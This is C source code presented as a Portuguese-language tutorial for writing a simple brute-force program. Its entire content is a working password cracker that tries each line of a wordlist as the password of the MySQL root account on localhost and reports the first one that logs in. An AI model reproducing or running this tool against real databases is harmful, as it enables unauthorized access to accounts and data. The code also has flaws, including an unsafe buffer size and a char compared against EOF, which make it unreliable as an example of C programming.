// Tutorial > Criando programa simples para brute-force em C
// By: MMxM [ hc0der.blogspot.com ]

#include <stdio.h>
#include <mysql/mysql.h>
#define host "localhost"
#define user "root"
#define wl "wordlist.txt"

int mysql_brute(const char *pass){
	MYSQL con;
	mysql_init(&con);
	int check = (int)mysql_real_connect(&con,host,user,pass,NULL,0,NULL,0);
	if(check != 0){
		mysql_close(&con);
		return(1);
	}
	return(0);
}

void GetParameters(FILE *arquivo,unsigned int *max,unsigned int *lines){
	char C;
	unsigned int x = 0,y = 0,aux = 0;

	while( (C = fgetc(arquivo)) != EOF ){
		if(C == '\n'){
			if(aux > x) x = aux;
			aux = 0;
			y++;
		}
		aux++;
	}

	*max = x;
	*lines = y;
	fseek(arquivo,0,SEEK_SET);
	return;
}

int main(void){
	FILE *wordlist;
	wordlist = fopen(wl,"r");
	if(wordlist == NULL) return(-1);
	unsigned int Maxlen = 0,NumberOfLines = 0,pos = 0;
	GetParameters(wordlist,&Maxlen,&NumberOfLines);

	char Password[Maxlen];
	char C;

	while ( (C=fgetc(wordlist)) != EOF ){
		if(C=='\n'){
			Password[pos] = '\0';
			pos = 0;
			printf("Testando: %s\n",Password);
			if(mysql_brute(Password)){
				printf("\n\n\tPassword Cracked: %s\n\n",Password);
				break;
			}
		} else {
			Password[pos] = C;
			pos++;
		}
	}

	printf("__END__\n\n");

	return 0;
}
